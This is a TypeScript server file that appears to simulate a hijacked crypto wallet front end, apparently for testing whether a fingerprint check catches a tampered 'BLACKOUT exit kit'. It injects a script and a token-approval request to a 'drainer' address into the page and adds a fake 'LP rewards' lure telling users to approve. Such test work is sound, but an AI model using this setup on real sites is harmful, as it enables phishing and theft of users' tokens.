import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { Address } from 'viem';
import { envPort, json, serve } from './http';
import { hijackRequest } from './hijack-request';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

/** Tampered kit: one byte changed in the title — enough to fail the ENS fingerprint check. */
export function tamperKit(html: Buffer): Buffer {
  const s = html.toString('utf8');
  const i = s.indexOf('<title>BLACKOUT exit kit</title>');
  if (i < 0) throw new Error('kit title not found');
  return Buffer.from(s.replace('<title>BLACKOUT exit kit</title>', '<title>BLACKOUT exit klt</title>'), 'utf8');
}

export function startHijack(opts: { port?: number; kitFile: string; token: Address; drainer?: Address }) {
  const page = readFileSync(join(ROOT, 'site', 'index.html'), 'utf8').replace(
    '<script src="/app.js"></script>',
    `<script src="/app.js"></script>\n  <script>window.__HIJACK_REQUEST__=${JSON.stringify(hijackRequest(opts.token, opts.drainer))}</script>\n  <script src="/inject.js"></script>`,
  ).replace('<!--LURE-->', '<div class="lure">🎁 Your LP rewards are ready. <b>Approve to view your rewards</b>, then click Connect wallet.</div>');
  const tampered = tamperKit(readFileSync(opts.kitFile));
  return serve(opts.port ?? envPort('HIJACK_PORT', 8082), (req, res) => {
    const path = (req.url ?? '/').split('?')[0];
    if (path === '/') return void res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(page);
    if (path === '/app.js') return void res.writeHead(200, { 'content-type': 'text/javascript' }).end(readFileSync(join(ROOT, 'site', 'app.js')));
    if (path === '/inject.js') return void res.writeHead(200, { 'content-type': 'text/javascript' }).end(readFileSync(join(ROOT, 'hijack', 'inject.js')));
    if (path === '/blackout-kit.html') return void res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(tampered);
    if (path === '/hijack-request.json') return json(res, hijackRequest(opts.token, opts.drainer));
    res.writeHead(404).end();
  });
}
